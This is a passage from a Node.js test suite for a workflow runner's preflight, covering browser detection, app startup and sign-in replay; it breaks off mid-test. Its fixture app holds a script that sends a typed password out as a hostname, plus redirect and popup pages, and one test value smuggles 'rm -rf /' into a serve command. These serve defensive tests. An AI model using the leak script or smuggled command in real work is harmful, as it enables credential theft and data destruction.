// Tests of the preflight of running-a-software-workflow (lib/preflight.cjs): the browser, the
// app that the serve command starts, and the sign-in of the demo scripts, and the points that
// a missing part writes, which check points passes and end sends with the verdict escalate.
// The sign-in tests start a real browser, and skip when this machine has none.
'use strict';

const assert = require('node:assert/strict');
const childProcess = require('node:child_process');
const fs = require('node:fs');
const http = require('node:http');
const net = require('node:net');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

const MODULES = path.join(__dirname, '../modules');
const PLUGIN = path.join(MODULES, 'core');
const SKILL = path.join(MODULES, 'software-factory/skills/running-a-software-workflow');
const { main } = require(path.join(PLUGIN, 'skills/running-a-workflow/checks.cjs'));
const { LIBRARY } = require(path.join(PLUGIN, 'skills/running-a-workflow/lib/registry.cjs'));
const { preflight } = require(path.join(SKILL, 'workflow-checks.cjs'))(LIBRARY);
const { findBrowser, keyOf } = require(path.join(SKILL, 'lib/browser.cjs'));
const replay = require(path.join(SKILL, 'lib/replay.cjs'));

const { signInSetups } = replay;
const { watch } = require('./first-line.js');

const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'preflight-test-')));
test.after(() => fs.rmSync(tmp, { recursive: true, force: true }));

// A browser of this machine for the sign-in tests: one that the preflight looks for, else the
// Chrome of macOS.
const BROWSER = findBrowser(process.env) ||
  findBrowser(process.env, ['/Applications/Google Chrome.app/Contents/MacOS/Google Chrome']);
const NO_BROWSER = BROWSER ? false
  : 'no browser such as /usr/bin/chromium is installed, so no sign-in can run';

const P01 = {
  text: 'The dev container has no browser, so the run could not open the app.',
  action: 'run_again',
  fix: 'Add a browser to .devcontainer/devcontainer.json, then run another round.',
};
const P02_TEXT = 'The app did not start in the dev container, so the run could not check the app.';
const P03_FIX = 'Ask an owner or admin of your organisation to correct the app\'s sign-in ' +
  'variables in Workspace settings > Secrets and variables, then run another round.';
const p03Text = (names) => `The run could not sign in to the app with the values of ${names} ` +
  'in the workspace\'s variables.';

// The app of the sign-in tests: a sign-in form at /sign-in that sends the reader to /orders
// when the password is APP_SECRET, and shows the form again when it is not. /away redirects
// to the form of another origin, the port OTHER_PORT, /link and /framed show a link to it and
// a frame of it, /popup posts the form to it in a new window, /leak sends the password as a
// host name of that port at the submit, and /alert shows the form with an alert at its load
// and at each key. The other origin adds a line to the file OTHER_LOG for each request.
const APP = `
const fs = require('fs');
const http = require('http');
const other = 'http://127.0.0.1:' + process.env.OTHER_PORT + '/sign-in';
const page = (body) => '<!doctype html><html><body>' + body + '</body></html>';
const form = (wrong) => page('<form method="post" action="/session">' +
  (wrong ? '<p>Wrong password</p>' : '') + '<input id="email" name="email">' +
  '<input id="password" name="password" type="password">' +
  '<button type="submit">Sign in</button></form>');
http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/session') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      if (new URLSearchParams(body).get('password') === process.env.APP_SECRET) {
        res.writeHead(303, { Location: '/orders' });
        res.end();
      } else {
        res.writeHead(200, { 'content-type': 'text/html' });
        res.end(form(true));
      }
    });
    return;
  }
  if (req.url === '/away') {
    res.writeHead(302, { Location: other });
    res.end();
    return;
  }
  res.writeHead(200, { 'content-type': 'text/html' });
  if (req.url === '/link') res.end(page('<a id="go" href="' + other + '">Go</a>'));
  else if (req.url === '/framed') res.end(page('<iframe src="' + other + '"></iframe>'));
  else if (req.url === '/popup') {
    res.end(form(false).replace('action="/session"', 'action="' + other + '" target="_blank"'));
  } else if (req.url === '/leak') {
    res.end(form(false).replace('</body>', '<script>document.forms[0].addEventListener(' +
      '"submit", (e) => { e.preventDefault(); location.href = "http://" + ' +
      'document.getElementById("password").value + ".localhost:' + process.env.OTHER_PORT +
      '/"; });</script></body>'));
  }
  else if (req.url === '/alert') {
    res.end(form(false).replace('</body>', '<script>alert("Welcome");' +
      'addEventListener("keydown", () => alert("Key"));</script></body>'));
  } else res.end(req.url === '/orders' ? page('<h1>Order 1042</h1>') : form(false));
}).listen(Number(process.env.APP_PORT), '127.0.0.1');
if (process.env.OTHER_PORT) {
  http.createServer((req, res) => {
    fs.appendFileSync(process.env.OTHER_LOG, req.method + ' ' + req.url + '\\n');
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(form(false));
  }).listen(Number(process.env.OTHER_PORT), '127.0.0.1');
}
`;

const SIGN_IN = [
  { do: 'open', url: '/sign-in' },
  { do: 'type', target: '#email', text: 'ana@example.com' },
  { do: 'type', target: '#password', variable: 'DEMO_PASSWORD' },
  { do: 'press', key: 'Enter' },
];

// script returns a demo script of scenario with setup.
const script = (scenario, setup) => ({
  scenario, title: 'Two parcels, one date', evidence: 'film', source: { version: 1 }, setup,
  steps: [{ step: 1, title: 'Open the order.', expected: 'The order shows.',
    actions: [{ do: 'click', target: 'text=Order 1042' }] }],
});

let folders = 0;

// checkout returns a new folder with the app in app/server.cjs and an artifact folder in
// .qory/artifacts.
function checkout() {
  const dir = path.join(tmp, `run-${++folders}`);
  fs.mkdirSync(path.join(dir, 'app'), { recursive: true });
  fs.mkdirSync(path.join(dir, '.qory', 'artifacts'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'app', 'server.cjs'), APP);
  return { dir, root: path.join(dir, '.qory', 'artifacts') };
}

// freePort returns a port of 127.0.0.1 that nothing listens on.
function freePort() {
  return new Promise((resolve) => {
    const server = net.createServer();
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      server.close(() => resolve(port));
    });
  });
}

// run runs the preflight in the checkout dir with root as its artifact folder.
function run({ dir, root }, parts, { env = {}, ...options } = {}) {
  const io = { cwd: dir, home: process.env.HOME, plugin: PLUGIN,
    env: { ...process.env, ...env }, preflight: { startMs: 5000, ...options } };
  const done = preflight.preflight(io, root, { scripts: [], ...parts });
  // Each finding starts with the step for the session, within 100 characters.
  const first = watch();
  done.findings.forEach((finding) => first.firstLine(finding.split('\n')[0]));
  first.check(done.status);
  return done;
}

// call runs the checks script with argv, and returns { status, out, err }.
function call(argv, deps = {}) {
  let out = '';
  let err = '';
  const status = main(argv, {
    out: { write: (chunk) => { out += chunk; } },
    err: { write: (chunk) => { err += chunk; } },
    plugin: PLUGIN, cwd: tmp, ...deps,
  });
  return { status, out, err };
}

const points = (root) => JSON.parse(fs.readFileSync(path.join(root, 'points.json'), 'utf8'));

// stub writes a qory that records each call's arguments in the file args, prints a work item
// of the run, pulls no verdict, and records the verdict escalate.
function stub() {
  const bin = path.join(tmp, `bin-${++folders}`);
  const store = path.join(bin, 'store');
  fs.mkdirSync(store, { recursive: true });
  const args = path.join(bin, 'args');
  fs.writeFileSync(path.join(bin, 'index.json'), JSON.stringify({ artifacts: [] }));
  fs.writeFileSync(path.join(bin, 'qory'), `#!/bin/sh\nprintf '%s\\n' "$*" >> '${args}'\n` +
    `case "$*" in\n'work-item show') echo '{"run":{"id":"run_9f4n2"}}'; exit 0;;\n` +
    `'artifact pull verdict') cp '${bin}/index.json' '${store}/index.json'; echo '${store}/'; ` +
    'exit 0;;\nesac\necho "Recorded the verdict escalate."\nexit 0\n', { mode: 0o755 });
  return { args, env: { ...process.env, QORY_RUN_ID: 'run-1',
    PATH: `${bin}${path.delimiter}${process.env.PATH}` } };
}

test('preflight: with the app stopped, the session ends escalate with the point of the app', async () => {
  const here = checkout();
  const port = await freePort();
  const command = `node app/missing.cjs --port ${port}`;
  const done = run(here, { serve: { command, url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
    { browsers: [process.execPath] });
  assert.equal(done.status, 1);
  assert.equal(done.findings.length, 1);
  const [first, why, fix] = done.findings[0].split('\n');
  assert.equal(first, 'End the session with points.json: the app did not start in the dev ' +
    'container.');
  assert.match(why, new RegExp('^the command exited with 1 before the address of the app ' +
    'returned a response\\. The output of the command is in .*serve\\.log\\.$'));
  assert.equal(fix, `The fix of its point: Make ${command} start the app in the dev container, ` +
    'then run another round.');
  assert.equal(done.last, 'Checked the browser and the app: 1 of 2 parts is missing, and ' +
    'points.json has a point run_again for each.');
  assert.match(fs.readFileSync(path.join(here.root, '.reports/preflight/serve.log'), 'utf8'),
    /Cannot find module/);
  // The text of the point is about the missing part, and its fix line has the step after it.
  const [point] = points(here.root);
  assert.deepEqual(Object.keys(point), ['text', 'action', 'fix']);
  assert.equal(point.text, P02_TEXT);
  assert.equal(point.action, 'run_again');
  assert.equal(point.fix, `Make ${command} start the app in the dev container, then run ` +
    'another round.');
  // The session checks the points, then the end check sends them with the verdict escalate.
  const file = path.join(here.root, 'points.json');
  const checked = call(['check', 'points', file], { cwd: here.dir });
  assert.equal(checked.status, 0, checked.out + checked.err);
  const { args, env } = stub();
  const ended = call(['end', here.root], { env });
  assert.equal(ended.status, 0, ended.out + ended.err);
  assert.match(ended.err, new RegExp('^Checked points\\.json: the run ended with it, and ' +
    'qory run verdict escalate exited with 0'));
  assert.deepEqual(fs.readFileSync(args, 'utf8').split('\n')
    .filter((line) => line.startsWith('run verdict')), [`run verdict escalate --points ${file}`]);
});

test('preflight: an app whose address responds passes, and its command stops after', async () => {
  const here = checkout();
  const port = await freePort();
  const done = run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${port}/sign-in`, cwd: here.dir } },
  { browsers: [process.execPath], env: { APP_PORT: String(port) } });
  assert.deepEqual(done.findings, []);
  assert.equal(done.status, 0);
  assert.equal(done.last, 'Checked the browser and the app: each part is there, and no ' +
    'sign-in: no demo script types a variable in its setup.');
  assert.equal(fs.existsSync(path.join(here.root, 'points.json')), false);
  // The serve command no longer runs, so the port is free again.
  const server = net.createServer();
  await new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(port, '127.0.0.1', resolve);
  });
  server.close();
});

test('preflight: an app whose address does not respond in time is missing', () => {
  const here = checkout();
  const done = run(here, { serve: { command: 'sleep 30', url: 'http://127.0.0.1:9/',
    cwd: here.dir } }, { browsers: [process.execPath], startMs: 1000 });
  assert.equal(done.status, 1);
  assert.match(done.findings[0].split('\n')[1],
    /^the address returned no response within 1 s\. /);
  assert.equal(points(here.root)[0].text, P02_TEXT);
});

test('preflight: no browser writes the point of the browser, and with no serve checks no app', () => {
  const here = checkout();
  const done = run(here, { serve: null, scripts: [script('scenario-1', SIGN_IN)] },
    { browsers: [path.join(tmp, 'no-browser')] });
  assert.equal(done.status, 1);
  assert.equal(done.findings[0].split('\n')[0],
    'End the session with points.json: the dev container has no browser.');
  assert.equal(done.findings[0].split('\n')[2], `The fix of its point: ${P01.fix}`);
  assert.match(done.last, /^Checked the browser: 1 of 1 part is missing/);
  assert.deepEqual(points(here.root), [P01]);
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
  // With a browser and no serve command, the preflight passes.
  const passed = run(checkout(), { serve: null }, { browsers: [process.execPath] });
  assert.equal(passed.status, 0);
  assert.equal(passed.last, 'Checked the browser: each part is there, and no app or sign-in: ' +
    'the build plan has no serve command.');
});

test('preflight: a missing browser and a stopped app write two points, and keep the earlier ones', () => {
  const here = checkout();
  const earlier = { text: 'The run could not run its checks script.', action: 'run_again' };
  fs.writeFileSync(path.join(here.root, 'points.json'), JSON.stringify([earlier, P01]));
  const done = run(here, { serve: { command: 'exit 3', url: 'http://127.0.0.1:9/',
    cwd: here.dir }, scripts: [script('scenario-1', SIGN_IN)] }, { browsers: [] });
  assert.equal(done.status, 1);
  assert.equal(done.findings.length, 2);
  const list = points(here.root);
  assert.deepEqual(list.map((one) => one.text), [earlier.text, P01.text, P02_TEXT]);
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
});

test('preflight: a serve command or a variable name that breaks the text of a point takes the fallback words', () => {
  const checks = (point) => {
    const here = checkout();
    const file = path.join(here.root, 'points.json');
    fs.writeFileSync(file, JSON.stringify([point]));
    const done = call(['check', 'points', file], { cwd: here.dir });
    assert.equal(done.status, 0, `${point.fix}\n${done.out}`);
  };
  const fallback = 'Make the serve command of the build plan start the app in the dev ' +
    'container, then run another round.';
  for (const command of ['node . --port 3000', '`npm run dev`', 'npm run **dev**',
    'npm run __dev__', 'make q1', 'cd web && npm start # d-1', `npm run ${'x'.repeat(500)}`,
    'npm run dev\nrm -rf /', '[dev](http://x.test)', '![dev](x.png)']) {
    const point = preflight.pointOf('app', command, { agents: new Set(),
      rules: LIBRARY.pointRules({ ids: ['ac', 'd', 'step', 'scenario', 'decision'] }) });
    assert.equal(point.fix, fallback, command);
    checks(point);
  }
  const kept = preflight.pointOf('app', 'npm run dev -- --port 3000', { agents: new Set(),
    rules: LIBRARY.pointRules() });
  assert.equal(kept.fix, 'Make npm run dev -- --port 3000 start the app in the dev container, ' +
    'then run another round.');
  checks(kept);
  const names = preflight.pointOf('signIn', 'DEMO__PASSWORD', { agents: new Set(),
    rules: LIBRARY.pointRules() });
  assert.equal(names.text, 'The run could not sign in to the app with the values of the ' +
    'sign-in variables of the demo scripts in the workspace\'s variables.');
  assert.equal(names.fix, P03_FIX);
  checks(names);
  assert.equal(preflight.joined(['A']), 'A');
  assert.equal(preflight.joined(['A', 'B']), 'A and B');
  assert.equal(preflight.joined(['A', 'B', 'C']), 'A, B and C');
});

test('preflight: the preflight stops its runner before the Bash tool stops it at 600 s', () => {
  // The runner stops its sign-ins at MAX_MS, and the preflight stops the runner STOP_MS later.
  assert.ok(preflight.MAX_MS + preflight.STOP_MS < 600000);
  assert.equal(preflight.MAX_MS, 570000);
  assert.equal(preflight.MAX_MS + preflight.STOP_MS, 585000);
});

test('preflight: the setups that type a variable count once, with their scenarios', () => {
  const other = [{ do: 'open', url: '/' }];
  const setups = signInSetups([script('scenario-1', SIGN_IN), script('scenario-2', other),
    script('scenario-3', SIGN_IN)]);
  assert.deepEqual(setups, [{ actions: SIGN_IN, names: ['DEMO_PASSWORD'],
    scenarios: ['scenario-1', 'scenario-3'] }]);
  assert.deepEqual(keyOf('Enter'), { key: 'Enter', code: 'Enter', keyCode: 13, text: '\r',
    modifiers: 0 });
  assert.equal(keyOf('Control+a').modifiers, 2);
  assert.equal(keyOf('Hyper+a'), null);
  // The runner may take the limit of each action of a setup: 15 s for the page, 15 s for an
  // open, 1 s for a press, the time of a wait, the time of the other actions and the time
  // after the last action.
  assert.equal(preflight.signInMs([...SIGN_IN, { do: 'wait', text: 'x', timeout_ms: 60000 }],
    5000, 10000), 15000 + 10000 + 15000 + 5000 + 5000 + 1000 + 60000);
});

// entry returns the entry of index.json for name of demo-script, with a version of each
// number of numbers, each [number, fields].
const entry = (name, numbers) => ({ type: 'demo-script', name, approved_version: null,
  newest_version: numbers.length ? Math.max(...numbers.map(([number]) => number)) : null,
  versions: numbers.map(([number, fields = {}]) => ({ id: `av_${name}_${number}`, number,
    ...fields })) });

test('preflight: the demo scripts are the newest versions that index.json counts', () => {
  const { root } = checkout();
  const write = (name, number, data) => {
    const dir = path.join(root, 'demo-script', name, `v${number}`);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, `${name}.json`), JSON.stringify(data));
  };
  const index = (artifacts) => fs.writeFileSync(path.join(root, 'index.json'),
    JSON.stringify({ artifacts }));
  write('scenario-2', 1, script('scenario-2', []));
  write('scenario-10', 1, script('scenario-10', []));
  write('scenario-2', 2, script('scenario-2', SIGN_IN));
  index([entry('scenario-10', [[1]]), entry('scenario-2', [[1], [2]])]);
  const io = { cwd: tmp, home: process.env.HOME };
  const read = () => preflight.demoScripts(root, io)
    .map((one) => [one.scenario, one.setup.length]);
  assert.deepEqual(read(), [['scenario-2', 4], ['scenario-10', 0]]);
  // A leftover folder above the newest version of index.json is not read, and neither is
  // a folder of a name that index.json does not list.
  write('scenario-10', 7, script('scenario-10', SIGN_IN));
  write('scenario-4', 1, script('scenario-4', SIGN_IN));
  assert.deepEqual(read(), [['scenario-2', 4], ['scenario-10', 0]]);
  // A version of a cancelled run counts for nothing, and a withdrawn name is no scenario.
  index([entry('scenario-10', [[1], [7, { cancelled: true }]]),
    entry('scenario-2', [[1], [2], [3, { withdrawn: true }]])]);
  assert.deepEqual(read(), [['scenario-10', 0]]);
  // A store without the folder of the newest version that counts gets the pull line.
  index([entry('scenario-10', [[1]]), entry('scenario-2', [[1], [2], [3]])]);
  assert.throws(read, (error) => error.message === 'Run `qory artifact pull demo-script ' +
    '--version 3`, then check again.');
  index([entry('scenario-3', [[1]])]);
  write('scenario-3', 1, { scenario: 'scenario-3' });
  assert.throws(read,
    /^Error: Push a demo script of scenario-3 that passes its check, then pull it\.$/);
  assert.deepEqual(preflight.demoScripts(checkout().root, io), []);
});

test('preflight: a sign-in opens only the address of the app, and types nothing after another', async () => {
  const calls = [];
  const page = { outside: null,
    goto: async (url) => { calls.push(`goto ${url}`); },
    type: async (target) => { calls.push(`type ${target}`); },
    press: async (key) => { calls.push(`press ${key}`); },
    click: async () => {}, waitText: async () => {}, visible: async () => false,
    poll: async (check) => check(),
  };
  const options = { base: 'http://127.0.0.1:4100/', env: { DEMO_PASSWORD: 'parcel-blue-41' },
    actionMs: 100, signedInMs: 100 };
  for (const url of ['https://sign-in.example.com/', '//sign-in.example.com/form',
    'http://127.0.0.1:4101/sign-in', 'https://127.0.0.1:4100/', 'data:text/html,<form>']) {
    calls.length = 0;
    const done = await replay.signIn(page, [{ do: 'open', url }, ...SIGN_IN.slice(1)], options);
    assert.equal(done.ok, false, url);
    assert.match(done.why, new RegExp('^action 1 \\(open .*\\) failed: the address is ' +
      'outside the app, whose origin is http://127\\.0\\.0\\.1:4100$'));
    assert.equal(done.outside, url.startsWith('data:') ? 'data:'
      : new URL(url, options.base).origin, url);
    assert.deepEqual(calls, [], url);
  }
  // Once the page has failed a load of another origin, the next action fails, and no later
  // action types.
  calls.length = 0;
  const left = { ...page, click: async () => { left.outside = 'https://sign-in.example.com'; } };
  const stopped = await replay.signIn(left, [{ do: 'open', url: '/sign-in' },
    { do: 'click', target: '#go' }, ...SIGN_IN.slice(1)], options);
  assert.deepEqual(stopped, { ok: false, why: 'action 3 (type into #email) failed: the page ' +
    'opened https://sign-in.example.com, outside the app',
  outside: 'https://sign-in.example.com' });
  assert.deepEqual(calls, ['goto http://127.0.0.1:4100/sign-in']);
  // An open of the app, by a path or by its whole address, passes.
  calls.length = 0;
  const passed = await replay.signIn(page, [...SIGN_IN,
    { do: 'open', url: 'http://127.0.0.1:4100/orders' }], options);
  assert.deepEqual(passed, { ok: true, why: null, outside: null });
  assert.deepEqual(calls, ['goto http://127.0.0.1:4100/sign-in', 'type #email',
    'type #password', 'press Enter', 'goto http://127.0.0.1:4100/orders']);
});

// signIn runs the preflight on the app with the setup of the demo scripts, with the value of
// DEMO_PASSWORD, or none when value is undefined, and the variables of more. The other origin
// of the app listens on the port other, and its log of requests is the file otherLog.
async function signIn(setup, value, more = {}) {
  const here = checkout();
  const port = await freePort();
  const other = await freePort();
  const otherLog = path.join(here.dir, 'other.log');
  fs.writeFileSync(otherLog, '');
  const env = { APP_PORT: String(port), APP_SECRET: 'parcel-blue-41', OTHER_PORT: String(other),
    OTHER_LOG: otherLog, ...more };
  if (value !== undefined) env.DEMO_PASSWORD = value;
  else env.DEMO_PASSWORD = '';
  const done = run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${port}/`, cwd: here.dir },
  scripts: [script('scenario-1', setup), script('scenario-2', setup)] },
  { browsers: [BROWSER], env, startMs: 10000, actionMs: 3000, signedInMs: 3000 });
  return { here, done, port, other, otherLog };
}

// alive reports whether the process pid still runs: on Linux, a process that ended and that
// nothing reaps, state Z in /proc/<pid>/stat, does not.
const alive = (pid) => {
  try {
    process.kill(pid, 0);
  } catch (error) {
    return error.code === 'EPERM';
  }
  try {
    return !/^\d+ \(.*\) Z /.test(fs.readFileSync(`/proc/${pid}/stat`, 'utf8'));
  } catch {
    return true;
  }
};

// isFree resolves to whether nothing listens on port of 127.0.0.1.
function isFree(port) {
  return new Promise((resolve) => {
    const server = net.createServer();
    server.once('error', () => resolve(false));
    server.listen(port, '127.0.0.1', () => server.close(() => resolve(true)));
  });
}

test('preflight: a sign-in with the right value passes', { skip: NO_BROWSER }, async () => {
  const { done } = await signIn(SIGN_IN, 'parcel-blue-41');
  assert.deepEqual(done.findings, []);
  assert.equal(done.last, 'Checked the browser, the app and the sign-in: each part is there.');
  const waited = await signIn([...SIGN_IN, { do: 'wait', text: 'Order 1042' }],
    'parcel-blue-41');
  assert.equal(waited.done.status, 0, waited.done.findings.join('\n'));
});

test('preflight: a sign-in with a wrong value writes the point of the sign-in', { skip: NO_BROWSER }, async () => {
  const { here, done } = await signIn(SIGN_IN, 'wrong-value-7');
  assert.equal(done.status, 1);
  const [first, why, fix] = done.findings[0].split('\n');
  assert.equal(first, 'End the session with points.json: the sign-in to the app failed.');
  assert.equal(why, 'The sign-in of scenario-1 and scenario-2 failed: the page still showed a ' +
    'field that a variable was typed into 3 s after the last action.');
  assert.equal(fix, `The fix of its point: ${P03_FIX}`);
  assert.deepEqual(points(here.root), [{ text: p03Text('DEMO_PASSWORD'), action: 'run_again',
    fix: P03_FIX }]);
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
  // A wait that never shows its text fails too.
  const waited = await signIn([...SIGN_IN, { do: 'wait', text: 'Order 1042',
    timeout_ms: 2000 }], 'wrong-value-7');
  assert.match(waited.done.findings[0].split('\n')[1],
    /: action 5 \(wait for a text\) failed: the page showed no such text within 2 s\.$/);
});

test('preflight: a sign-in with no value, or a target that is not there, fails with the names', { skip: NO_BROWSER }, async () => {
  const { here, done } = await signIn(SIGN_IN, undefined);
  assert.match(done.findings[0].split('\n')[1],
    /: action 3 \(type into #password\) failed: the variable DEMO_PASSWORD has no value\.$/);
  assert.equal(points(here.root)[0].text, p03Text('DEMO_PASSWORD'));
  const setup = [...SIGN_IN.slice(0, 2), { do: 'type', target: '#pin', variable: 'DEMO_PIN' },
    ...SIGN_IN.slice(2)];
  const missing = await signIn(setup, 'parcel-blue-41', { DEMO_PIN: '4410' });
  assert.match(missing.done.findings[0].split('\n')[1],
    /: action 3 \(type into #pin\) failed: no element of the target showed within 3 s\.$/);
  assert.equal(points(missing.here.root)[0].text, p03Text('DEMO_PIN and DEMO_PASSWORD'));
});

// outsidePoint returns the point of a sign-in that loads a page of origin, outside the app at
// address.
const outsidePoint = (address, origin) => ({
  text: `The sign-in of the app at ${address} opens ${origin}, and the run may open only the ` +
    'app\'s pages.',
  action: 'run_again',
  fix: `Make the app's sign-in work in the dev container without leaving ${address}, then run ` +
    'another round.',
});

test('preflight: a sign-in that opens another site writes the point of the page outside the app', { skip: NO_BROWSER }, async () => {
  const { here, done, port } = await signIn([{ do: 'open', url: 'https://sign-in.example.com/' },
    ...SIGN_IN.slice(1)], 'parcel-blue-41');
  assert.equal(done.status, 1);
  const [first, why, fix] = done.findings[0].split('\n');
  assert.equal(first, 'End the session with points.json: the sign-in opened a page outside the ' +
    'app.');
  assert.equal(why, 'The sign-in of scenario-1 and scenario-2 failed: action 1 (open ' +
    'https://sign-in.example.com/) failed: the address is outside the app, whose origin is ' +
    `http://127.0.0.1:${port}.`);
  const address = `http://127.0.0.1:${port}/`;
  assert.equal(fix,
    `The fix of its point: ${outsidePoint(address, 'https://sign-in.example.com').fix}`);
  assert.deepEqual(points(here.root), [outsidePoint(address, 'https://sign-in.example.com')]);
  const checked = call(['check', 'points', path.join(here.root, 'points.json')], { cwd: here.dir });
  assert.equal(checked.status, 0, checked.out);
});

test('preflight: a redirect, a link or a frame to another origin loads nothing there, and types nothing', { skip: NO_BROWSER }, async () => {
  for (const [setup, action] of [
    [[{ do: 'open', url: '/away' }, ...SIGN_IN.slice(1)], 'action 1 (open /away)'],
    [[{ do: 'open', url: '/link' }, { do: 'click', target: '#go' }, ...SIGN_IN.slice(1)],
      'action 3 (type into #email)'],
    [[{ do: 'open', url: '/framed' }, ...SIGN_IN.slice(1)], 'action 2 (type into #email)'],
  ]) {
    const { here, done, port, other, otherLog } = await signIn(setup, 'parcel-blue-41');
    const words = setup[0].url;
    assert.equal(done.status, 1, words);
    assert.equal(done.findings.length, 1, done.findings.join('\n'));
    const origin = `http://127.0.0.1:${other}`;
    assert.equal(done.findings[0].split('\n')[1], 'The sign-in of scenario-1 and scenario-2 ' +
      `failed: ${action} failed: the page opened ${origin}, outside the app.`, words);
    assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, origin)], words);
    // The browser sent no request to the other origin, so no value of a variable went there.
    assert.equal(fs.readFileSync(otherLog, 'utf8'), '', words);
    assert.equal(await isFree(port), true, words);
  }
});

test('preflight: a sign-in that opens a new window of another origin writes the point of the page outside the app', { skip: NO_BROWSER }, async () => {
  const { here, done, port, other, otherLog } = await signIn([{ do: 'open', url: '/popup' },
    ...SIGN_IN.slice(1)], 'parcel-blue-41');
  assert.equal(done.status, 1);
  const origin = `http://127.0.0.1:${other}`;
  assert.equal(done.findings[0].split('\n')[1], 'The sign-in of scenario-1 and scenario-2 ' +
    `failed: the page opened ${origin}, outside the app, after the last action.`);
  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, origin)]);
  assert.equal(fs.readFileSync(otherLog, 'utf8'), '');
  assert.equal(await isFree(port), true);
});

test('preflight: an outside origin that contains a typed value is another origin in the point and the finding', { skip: NO_BROWSER }, async () => {
  const value = 'Parcel-Blue-41';
  const { here, done, port, otherLog } = await signIn([{ do: 'open', url: '/leak' },
    ...SIGN_IN.slice(1)], value);
  assert.equal(done.status, 1);
  assert.equal(done.findings.length, 1, done.findings.join('\n'));
  assert.match(done.findings[0].split('\n')[1], /the page opened another origin, outside the /);
  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`,
    'another origin')]);
  const printed = [...done.findings, done.last].join('\n').toLowerCase();
  assert.equal(printed.includes(value.toLowerCase()), false, printed);
  const file = fs.readFileSync(path.join(here.root, 'points.json'), 'utf8').toLowerCase();
  assert.equal(file.includes(value.toLowerCase()), false, file);
  assert.equal(fs.readFileSync(otherLog, 'utf8'), '');
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
});

test('preflight: a data: address keeps data: as the origin in the point', { skip: NO_BROWSER }, async () => {
  const { here, done, port } = await signIn([{ do: 'open', url: 'data:text/html,<p>Sign in</p>' },
    ...SIGN_IN.slice(1)], 'parcel-blue-41');
  assert.equal(done.status, 1);
  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, 'data:')]);
  const checked = call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir });
  assert.equal(checked.status, 0, checked.out);
});

test('preflight: an alert of the app does not stop the sign-in', { skip: NO_BROWSER }, async () => {
  const started = Date.now();
  const { done } = await signIn([{ do: 'open', url: '/alert' }, ...SIGN_IN.slice(1)],
    'parcel-blue-41');
  assert.deepEqual(done.findings, []);
  assert.ok(Date.now() - started < 30000);
});

test('preflight: the replay types only into the element of the target', { skip: NO_BROWSER }, async () => {
  const { done } = await signIn([{ do: 'open', url: '/orders' },
    { do: 'type', target: 'h1', variable: 'DEMO_PASSWORD' }], 'parcel-blue-41');
  assert.match(done.findings[0].split('\n')[1], new RegExp(': action 2 \\(type into h1\\) ' +
    'failed: the focus is not in the element of the target\\.$'));
});

const RUNNER = path.join(SKILL, 'lib/preflight-run.cjs');

// runner starts lib/preflight-run.cjs with spec, and resolves to { status, signal, out }; after
// ms, when given, it sends the runner SIGTERM.
function runner(spec, { ms, env = {} } = {}) {
  return new Promise((resolve) => {
    const child = childProcess.spawn(process.execPath, [RUNNER],
      { stdio: ['pipe', 'pipe', 'pipe'], env: { ...process.env, ...env } });
    let out = '';
    child.stdout.on('data', (data) => { out += data; });
    child.stderr.on('data', () => {});
    child.stdin.end(JSON.stringify(spec));
    if (ms) setTimeout(() => child.kill('SIGTERM'), ms);
    child.on('exit', (status, signal) => resolve({ status, signal, out }));
  });
}

// listening starts a server of another process on port, which returns ok to each request, and
// resolves to that process once it listens.
function listening(port) {
  return new Promise((resolve) => {
    const child = childProcess.spawn(process.execPath, ['-e', 'require("http").createServer(' +
      `(q, r) => r.end("ok")).listen(${port}, "127.0.0.1", () => console.log("ready"))`],
    { stdio: ['ignore', 'pipe', 'ignore'] });
    child.stdout.once('data', () => resolve(child));
  });
}

test('preflight: another process at the address of the app counts as an app that did not start', async () => {
  const here = checkout();
  const port = await freePort();
  const other = await listening(port);
  try {
    const url = `http://127.0.0.1:${port}/`;
    const done = run(here, { serve: { command: 'echo started > started.txt', url,
      cwd: here.dir } }, { browsers: [process.execPath] });
    assert.equal(done.status, 1);
    assert.equal(done.findings[0].split('\n')[1], `another process already returns a response ` +
      `at ${url}, so the run did not start the serve command.`);
    assert.equal(points(here.root)[0].text, P02_TEXT);
    assert.equal(fs.existsSync(path.join(here.dir, 'started.txt')), false);
  } finally {
    other.kill('SIGKILL');
  }
});

test('preflight: a command that starts the app in the background and exits 0 passes, and the app stops after', async () => {
  const here = checkout();
  const port = await freePort();
  const done = run(here, { serve: { command: 'node app/server.cjs > /dev/null 2>&1 &',
    url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
  { browsers: [process.execPath], env: { APP_PORT: String(port) } });
  assert.deepEqual(done.findings, []);
  assert.equal(await isFree(port), true);
});

test('preflight: a FIFO or a symbolic link at the log of the serve command gives way to a new file', async () => {
  for (const kind of ['fifo', 'link']) {
    const here = checkout();
    const port = await freePort();
    const log = path.join(here.root, '.reports', 'preflight', 'serve.log');
    fs.mkdirSync(path.dirname(log), { recursive: true });
    const target = path.join(here.dir, 'kept.txt');
    if (kind === 'fifo') {
      assert.equal(childProcess.spawnSync('mkfifo', [log]).status, 0);
    } else {
